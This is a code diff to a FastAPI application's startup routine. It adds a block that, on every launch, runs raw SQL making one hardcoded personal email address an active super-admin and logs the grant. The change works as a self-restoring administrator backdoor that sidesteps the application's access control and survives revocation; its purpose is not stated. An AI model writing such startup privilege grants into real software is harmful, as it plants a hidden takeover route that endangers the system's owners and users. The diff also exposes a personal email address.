@@ -52,6 +52,19 @@ async def lifespan(app: FastAPI):
         logger.warning(f"create_all skipped (tables may already exist via alembic): {e}")
 
     try:
+        # FORCE PROMOTE ADMIN ON STARTUP
+        db = SessionLocal()
+        try:
+            from sqlalchemy import text
+            db.execute(text("UPDATE users SET is_superuser = true, is_active = true, role = 'super_admin' WHERE email = 'honguyenhung2010@gmail.com'"))
+            db.commit()
+            logger.info("Successfully granted admin privileges to honguyenhung2010@gmail.com")
+        finally:
+            db.close()
+    except Exception as e:
+        logger.error(f"Failed to grant admin privileges: {e}")
+
+    try:
         from app.models.webinar import WebinarRegistration
         WebinarRegistration.metadata.create_all(bind=engine)
         logger.info("Webinar table created/verified")
